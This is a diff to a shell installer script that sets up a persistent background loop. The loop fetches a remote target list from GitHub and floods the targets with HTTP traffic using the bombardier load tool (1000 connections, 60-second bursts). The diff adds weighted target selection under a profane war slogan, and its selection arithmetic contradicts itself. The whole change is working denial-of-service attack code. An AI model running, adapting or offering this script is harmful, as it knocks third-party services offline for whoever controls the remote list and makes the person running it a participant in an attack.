@@ -636,17 +636,31 @@ else
 	do_install
 fi
 
+
 echo "Русский корабль, иди нахуй! Можно отсоединяться, дальше я сам :)"
 screen -dm bash -c '
 while true
 do
 	readarray -t list < <(curl https://raw.githubusercontent.com/dmitryshagin/targets/main/list)
+	targets_count=${#list[@]}
+	top_20_count=$(( targets_count*20/100 ))
+
+	let top_20_count="$targets_count/2"
+	let remaining_count="$targets_count - $top_20_count - 1"
+
+	top_20=( "${list[@]:0:$top_20_count}" )
+	remaining=( "${list[@]:$top_20_count:$remaining_count}" )
+
 	for i in {1..5}
 	do
-	  target=${list[RANDOM%${#list[@]}]}
+	  if [ $(($RANDOM%10)) -lt 7 ]; then
+	   target=${top_20[RANDOM%${#top_20[@]}]}
+	  else
+	   target=${remaining[RANDOM%${#remaining[@]}]}
+	  fi
 	  echo "$target"
 	  docker run -it alpine/bombardier -c 1000 -d 60s -l "$target"
-	  sleep 1;
+	  sleep 3;
 	done
 done
 '
